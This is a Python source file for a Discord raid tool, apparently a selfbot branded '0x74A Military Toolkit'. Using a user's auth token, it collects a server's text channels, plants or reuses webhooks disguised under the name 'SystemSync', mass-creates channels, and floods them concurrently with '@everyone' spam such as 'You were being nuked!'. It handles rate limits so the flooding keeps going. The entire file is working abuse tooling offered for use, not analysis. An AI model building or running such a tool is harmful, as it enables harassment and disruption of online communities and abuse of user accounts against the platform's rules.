import asyncio
import aiohttp
import random
import string
import logging

logger = logging.getLogger(__name__)

MESSAGES = [
    "@everyone Bombed By 0x74A",
    "@everyone Pawned By 0x74A",
    "@everyone You were being nuked!",
    "@everyone 0x74A a.k.a Praxis was Here!",
    "@everyone SELFBOT MADE BY PRAXIS! | NO-RATE LIMIT!",
]

MAX_CONCURRENCY = 25
SLEEP_PER_WAVES = 0.01


async def fetch_channels_from_server(session: aiohttp.ClientSession, server_id: str, auth_token: str):
    url = f"https://discord.com/api/v9/guilds/{server_id}/channels"
    headers = {"Authorization": auth_token}

    try:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                channels = await resp.json()
                text_channels = [ch for ch in channels if ch.get('type') in [0, 10]]
                logger.info(f"Found {len(text_channels)} text channels")
                return text_channels
            else:
                logger.error(f"Failed to fetch channels (Status: {resp.status})")
                return []
    except Exception as e:
        logger.error(f"Error fetching channels: {e}")
        return []


async def create_single_webhook(session: aiohttp.ClientSession, channel_id: str, auth_token: str):
    url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"
    try:
        async with session.post(url, json={"name": "SystemSync"}, headers={"Authorization": auth_token}) as r:
            if r.status == 200:
                data = await r.json()
                webhook = f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
                logger.info(f"Created webhook in channel {channel_id[-6:]}")
                return webhook
            else:
                logger.warning(f"Failed to create webhook (Status {r.status})")
                return None
    except Exception as e:
        logger.error(f"Error creating webhook: {e}")
        return None


async def create_webhooks(session: aiohttp.ClientSession, channels: list, auth_token: str):
    hooks = []
    logger.info(f"Creating webhooks in {len(channels)} channels...")

    for cid in channels:
        url = f"https://discord.com/api/v9/channels/{cid}/webhooks"
        try:
            async with session.post(url, json={"name": "SystemSync"}, headers={"Authorization": auth_token}) as r:
                if r.status == 200:
                    data = await r.json()
                    webhook = f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
                    hooks.append(webhook)
                    logger.info("Webhook created")
                else:
                    logger.warning(f"Failed (Status {r.status})")
        except Exception:
            logger.error("Error creating webhook")

        await asyncio.sleep(0.3)

    return hooks


async def fetch_webhooks(session: aiohttp.ClientSession, channels: list, auth_token: str):
    hooks = []
    logger.info("Scanning for existing webhooks...")

    for cid in channels:
        list_url = f"https://discord.com/api/v9/channels/{cid}/webhooks"
        try:
            async with session.get(list_url, headers={"Authorization": auth_token}) as resp:
                if resp.status == 200:
                    existing = await resp.json()
                    found = False
                    for wh in existing:
                        if wh.get("name") == "SystemSync":
                            webhook_url = f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
                            hooks.append(webhook_url)
                            logger.info(f"Found existing webhook in channel {cid[-6:]}")
                            found = True
                            break
                    if not found:
                        logger.info(f"No webhook found in {cid[-6:]}, creating...")
                        new_hook = await create_single_webhook(session, cid, auth_token)
                        if new_hook:
                            hooks.append(new_hook)
                else:
                    new_hook = await create_single_webhook(session, cid, auth_token)
                    if new_hook:
                        hooks.append(new_hook)
        except Exception:
            new_hook = await create_single_webhook(session, cid, auth_token)
            if new_hook:
                hooks.append(new_hook)

        await asyncio.sleep(0.3)

    logger.info(f"Total webhooks ready: {len(hooks)}")
    return hooks


async def create_channels_bulk(session: aiohttp.ClientSession, server_id: str, amount: int, base_name: str, auth_token: str):
    created_count = 0
    created_channels = []
    logger.info(f"Creating {amount} channels with base name '{base_name}'...")

    for i in range(1, amount + 1):
        channel_name = f"{base_name}-{i:02d}" if amount > 1 else base_name

        url = f"https://discord.com/api/v9/guilds/{server_id}/channels"
        payload = {
            "name": channel_name,
            "type": 0,
            "topic": "Created by 0x74A Military Toolkit"
        }
        headers = {"Authorization": auth_token, "Content-Type": "application/json"}

        try:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 201:
                    data = await resp.json()
                    logger.info(f"Created: #{channel_name} (ID: {data['id']})")
                    created_count += 1
                    created_channels.append(data['id'])
                else:
                    logger.error(f"Failed to create #{channel_name} | Status: {resp.status}")
        except Exception as e:
            logger.error(f"Error creating #{channel_name}: {e}")

        await asyncio.sleep(0.03)

    logger.info(f"Successfully created {created_count}/{amount} channels.")
    return {"created": created_count, "total": amount, "channel_ids": created_channels}


async def send_ping(session: aiohttp.ClientSession, webhook_url: str, semaphore: asyncio.Semaphore):
    async with semaphore:
        noise = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        message = random.choice(MESSAGES)
        payload = {
            "content": f"{message} | {noise}",
            "username": "Military"
        }
        try:
            async with session.post(webhook_url, json=payload) as resp:
                if resp.status == 429:
                    try:
                        d = await resp.json()
                        await asyncio.sleep(d.get('retry_after', 0.01))
                    except Exception:
                        await asyncio.sleep(0.01)
                return resp.status
        except Exception:
            return 0


async def start_bombing(session: aiohttp.ClientSession, hooks: list, max_messages: int = 50):
    if not hooks:
        return {"sent": 0, "rate_limited": 0, "errors": 0, "duration": 0.0}

    sem = asyncio.Semaphore(MAX_CONCURRENCY)
    start_time = asyncio.get_event_loop().time()
    total_sent = 0
    rate_limited = 0
    errors = 0

    logger.info(f"WAR STARTED! Using {len(hooks)} webhooks @ {MAX_CONCURRENCY} concurrency")

    try:
        while total_sent < max_messages:
            remaining = max_messages - total_sent
            batch_size = min(MAX_CONCURRENCY, remaining)

            tasks = []
            for _ in range(batch_size):
                webhook = random.choice(hooks)
                tasks.append(send_ping(session, webhook, sem))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for res in results:
                if isinstance(res, int) and res == 200:
                    total_sent += 1
                elif isinstance(res, int) and res == 429:
                    rate_limited += 1
                else:
                    errors += 1

            await asyncio.sleep(SLEEP_PER_WAVES)

    except Exception as e:
        logger.error(f"Error during bombing: {e}")
        errors += 1
    finally:
        elapsed = asyncio.get_event_loop().time() - start_time
        logger.info(f"Raid stopped. Total sent: {total_sent:,}")

    return {
        "sent": total_sent,
        "rate_limited": rate_limited,
        "errors": errors,
        "duration": round(elapsed, 2)
    }
